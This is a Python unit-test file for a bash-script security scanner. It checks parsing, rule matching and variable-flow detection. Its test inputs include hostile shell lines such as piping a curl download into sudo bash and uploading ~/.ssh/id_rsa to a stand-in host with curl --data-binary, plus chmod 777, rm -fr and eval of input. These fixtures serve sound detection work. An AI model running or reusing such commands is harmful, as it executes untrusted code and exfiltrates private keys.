import importlib.util
import json
import random
import tempfile
import unittest
from pathlib import Path

from nexa_scriptguard.analysis import analyze


HAS_PARSER = bool(
    importlib.util.find_spec("tree_sitter")
    and importlib.util.find_spec("tree_sitter_bash")
)


@unittest.skipUnless(HAS_PARSER, "tree-sitter-bash dependency is not installed")
class BashParserTests(unittest.TestCase):
    def scan(self, source):
        with tempfile.TemporaryDirectory() as temp:
            script = Path(temp) / "sample.sh"
            script.write_text(source, encoding="utf-8")
            return analyze(script)

    def test_pipeline_across_lines_and_shell_wrapper(self):
        result = self.scan("curl https://example.invalid/a \\\n  | sudo bash\n")
        self.assertTrue(result.complete)
        self.assertIn("SG-001", {finding.rule_id for finding in result.findings})

    def test_literal_and_comment_are_not_commands(self):
        result = self.scan(
            'echo "curl https://example.invalid/a | bash"\n'
            "echo ok # curl https://example.invalid/a | bash\n"
        )
        self.assertEqual(result.findings, [])

    def test_heredoc_content_is_not_treated_as_command(self):
        result = self.scan("cat <<'EOF'\ncurl https://example.invalid/a | bash\nEOF\n")
        self.assertEqual(result.findings, [])

    def test_rules_inspect_syntax_command_nodes(self):
        result = self.scan("chmod 777 ./file\nrm -fr ./tmp\neval \"$INPUT\"\n")
        ids = {finding.rule_id for finding in result.findings}
        self.assertTrue({"SG-003", "SG-004", "SG-005"} <= ids)

    def test_invalid_syntax_is_reported_as_incomplete(self):
        result = self.scan("if then\n")
        self.assertFalse(result.complete)
        self.assertTrue(result.incomplete_reasons)

    def test_multiline_syntax_categories_are_present(self):
        source = (
            "function deploy() { echo \"${TARGET}\"; }\n"
            "if [ -n \"$TARGET\" ]; then deploy; fi\n"
            "for item in a b; do echo \"$item\"; done\n"
            "(echo subshell) | cat\n"
        )
        with tempfile.TemporaryDirectory() as temp:
            script = Path(temp) / "sample.sh"
            script.write_text(source, encoding="utf-8")
            from nexa_scriptguard.ingestion import read_source
            from nexa_scriptguard.limits import ScanLimits
            from nexa_scriptguard.parser import parse_bash

            document = parse_bash(read_source(script, ScanLimits()).data, ScanLimits())
        kinds = {node.kind for node in document.walk()}
        self.assertTrue(
            {"function_definition", "if_statement", "for_statement", "pipeline"} <= kinds
        )

    def test_synthetic_corpus_positive_negative_and_ambiguous(self):
        corpus = (
            Path(__file__).parent / "corpus" / "bash_cases.json"
        ).read_text(encoding="utf-8")
        for case in json.loads(corpus):
            with self.subTest(case=case["name"], kind=case["classification"]):
                result = self.scan(case["source"])
                actual = {finding.rule_id for finding in result.findings}
                self.assertTrue(set(case["expected_rules"]) <= actual)

    def test_variable_flow_has_source_and_destination_evidence(self):
        result = self.scan(
            'SOURCE="curl https://example.invalid/payload"\n'
            "$SOURCE | bash\n"
        )
        finding = next(
            item for item in result.findings if item.rule_id == "SG-FLOW-001"
        )
        self.assertIn(
            finding.correlation[0]["relationship"],
            {"possible", "indeterminate"},
        )
        self.assertIn("source", finding.correlation[0])
        self.assertIn("destination", finding.correlation[0])

    def test_multiple_variable_hops_preserve_assignment_chain(self):
        result = self.scan(
            'SOURCE="curl https://example.invalid/payload"\n'
            "COMMAND=$SOURCE\n"
            "$COMMAND | bash\n"
        )
        finding = next(
            item for item in result.findings if item.rule_id == "SG-FLOW-001"
        )
        self.assertIn("COMMAND", finding.correlation[0]["assignment_chain"])
        self.assertIn("SOURCE", finding.correlation[0]["assignment_chain"])

    def test_reassignment_prevents_stale_flow_match(self):
        result = self.scan(
            'SOURCE="curl https://example.invalid/payload"\n'
            "SOURCE=echo\n"
            "$SOURCE | bash\n"
        )
        self.assertNotIn(
            "SG-FLOW-001", {finding.rule_id for finding in result.findings}
        )

    def test_assignment_after_sink_on_same_line_is_not_correlated(self):
        result = self.scan('bash -c "$URL"; URL=curl\n')
        self.assertNotIn(
            "SG-FLOW-001", {finding.rule_id for finding in result.findings}
        )

    def test_sensitive_assignment_to_upload_has_two_site_evidence(self):
        result = self.scan(
            "CREDENTIAL=~/.ssh/id_rsa\n"
            "curl --data-binary @$CREDENTIAL https://example.invalid/upload\n"
        )
        finding = next(
            item for item in result.findings if item.rule_id == "SG-FLOW-002"
        )
        self.assertEqual(finding.correlation[0]["relationship"], "possible")
        self.assertEqual(finding.correlation[0]["variable"], "CREDENTIAL")

    def test_unicode_columns_are_character_based(self):
        result = self.scan("# café\n   chmod 777 ./artifact\n")
        finding = next(item for item in result.findings if item.rule_id == "SG-003")
        self.assertEqual(finding.location.start_line, 2)
        self.assertGreaterEqual(finding.location.start_column, 4)

    def test_seeded_parser_fuzz_smoke(self):
        from nexa_scriptguard.limits import ScanLimits
        from nexa_scriptguard.parser import parse_bash

        randomizer = random.Random(20261120)
        atoms = [
            "echo", "if", "then", "fi", "for", "do", "done", "(", ")",
            "|", ">", ">>", "$x", "${name}", "'text'", '"text"', "\\\n",
            "curl https://example.invalid", "chmod 777 x", "# note",
        ]
        for _ in range(250):
            source = " ".join(
                randomizer.choice(atoms)
                for _ in range(randomizer.randint(1, 16))
            )
            document = parse_bash(source.encode("utf-8"), ScanLimits())
            self.assertLessEqual(document.node_count, 250_000)
